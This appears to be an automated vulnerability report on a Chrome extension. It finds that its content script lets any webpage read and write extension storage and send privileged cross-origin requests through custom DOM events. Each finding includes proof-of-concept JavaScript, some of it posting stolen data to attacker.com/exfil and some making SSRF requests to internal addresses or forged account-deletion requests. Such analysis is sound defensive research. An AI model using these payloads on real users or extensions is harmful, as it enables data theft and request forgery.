# CoCo Analysis: pdfbomaikgljfkfgplcpkpgpbnjallac

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (chrome_storage_local_set_sink, fetch_resource_sink, fetch_options_sink)

---

## Sink 1: document_eventListener_saveDataInStorage → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pdfbomaikgljfkfgplcpkpgpbnjallac/opgen_generated_files/cs_0.js
Line 505-509

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
document.addEventListener('saveDataInStorage', function (e) {
    var key = e.detail.key;     // ← attacker-controlled
    var value = e.detail.value; // ← attacker-controlled

    chrome.storage.local.set({[key]: value}); // Storage sink
});

// Later in cs_0.js (lines 513-520) - Storage read handler
document.addEventListener('getDataFromStorage', function (e) {
    var key = e.detail.key;     // ← attacker-controlled
    var storage_counter = e.detail.counter;

    chrome.storage.local.get([key], function (items) {
        document.dispatchEvent(new CustomEvent(storage_counter + '_responseDataFromStorage',
            { detail: {'response': items[key]} })); // ← sends stored data back to webpage
    });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom events - webpage can dispatch events to trigger storage operations

**Attack:**

```javascript
// On any webpage where this extension's content script runs (all_urls)

// Step 1: Poison storage
document.dispatchEvent(new CustomEvent('saveDataInStorage', {
    detail: {
        key: 'sensitive_data',
        value: 'attacker_payload'
    }
}));

// Step 2: Retrieve the poisoned data back to attacker's webpage
document.addEventListener('mycounter_responseDataFromStorage', function(e) {
    console.log('Stolen data:', e.detail.response);
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(e.detail.response)
    });
});

document.dispatchEvent(new CustomEvent('getDataFromStorage', {
    detail: {
        key: 'sensitive_data',
        counter: 'mycounter'
    }
}));
```

**Impact:** Complete storage exploitation chain - attacker can write arbitrary data to chrome.storage.local and retrieve it back, enabling persistent storage manipulation and data exfiltration.

---

## Sink 2: document_eventListener_requestHttp → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pdfbomaikgljfkfgplcpkpgpbnjallac/opgen_generated_files/cs_0.js
Line 523-524

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
document.addEventListener('requestHttp', function (e) {
    var url = e.detail.url;           // ← attacker-controlled
    var init = JSON.parse(e.detail.init); // ← attacker-controlled
    var http_counter = e.detail.counter;

    fetchResource(url, init).then(r => r.text()).then(result => {
        document.dispatchEvent(new CustomEvent(http_counter + '_responseHttp',
            { detail: {'response': result} })); // ← sends response back to webpage
    }).catch(error => {
        document.dispatchEvent(new CustomEvent(http_counter + '_errorHttp',
            { detail: {'response': error} }));
    });
});

// fetchResource function (lines 545-564) - sends to background for privileged fetch
function fetchResource(url, init) {
    return new Promise((resolve, reject) => {
        chrome.runtime.sendMessage({url, init}, messageResponse => {
            const [response, error] = messageResponse;
            if (response === null) {
                reject(error);
            } else {
                const body = response.body ? new Blob([response.body]) : undefined;
                resolve(new Response(body, {
                    status: response.status,
                    statusText: response.statusText,
                }));
            }
        });
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom events - webpage can dispatch events to trigger privileged cross-origin requests

**Attack:**

```javascript
// On any webpage where this extension's content script runs (all_urls)

// Listen for response
document.addEventListener('attack_responseHttp', function(e) {
    console.log('Internal resource response:', e.detail.response);
    // Exfiltrate internal data
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: e.detail.response
    });
});

// Trigger privileged SSRF to internal network
document.dispatchEvent(new CustomEvent('requestHttp', {
    detail: {
        url: 'http://192.168.1.1/admin',  // Internal network
        init: JSON.stringify({
            method: 'GET',
            credentials: 'include'
        }),
        counter: 'attack'
    }
}));

// Or attack external API with extension's origin
document.dispatchEvent(new CustomEvent('requestHttp', {
    detail: {
        url: 'https://api.example.com/sensitive',
        init: JSON.stringify({
            method: 'GET',
            credentials: 'include'  // Sends extension's cookies
        }),
        counter: 'attack'
    }
}));
```

**Impact:** Privileged cross-origin request forgery (SSRF) - attacker can make arbitrary HTTP requests with extension privileges, bypass CORS, access internal network resources, and receive responses back to the webpage.

---

## Sink 3: document_eventListener_requestHttp → fetch_options_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pdfbomaikgljfkfgplcpkpgpbnjallac/opgen_generated_files/cs_0.js
Line 523-525

**Code:**

```javascript
// Content script (cs_0.js) - Entry point (same as Sink 2)
document.addEventListener('requestHttp', function (e) {
    var url = e.detail.url;           // ← attacker-controlled
    var init = JSON.parse(e.detail.init); // ← attacker-controlled (fetch options)
    var http_counter = e.detail.counter;

    fetchResource(url, init).then(r => r.text()).then(result => {
        document.dispatchEvent(new CustomEvent(http_counter + '_responseHttp',
            { detail: {'response': result} }));
    });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom events - webpage controls both URL and fetch options (method, headers, body, credentials)

**Attack:**

```javascript
// On any webpage where this extension's content script runs (all_urls)

// Attack with custom headers and POST body
document.dispatchEvent(new CustomEvent('requestHttp', {
    detail: {
        url: 'https://api.victim.com/delete-account',
        init: JSON.stringify({
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Custom-Header': 'malicious-value'
            },
            body: JSON.stringify({
                accountId: '12345',
                action: 'delete'
            }),
            credentials: 'include'
        }),
        counter: 'attack'
    }
}));
```

**Impact:** Full control over privileged HTTP requests including method, headers, body, and credentials, enabling sophisticated SSRF and CSRF attacks against any origin.
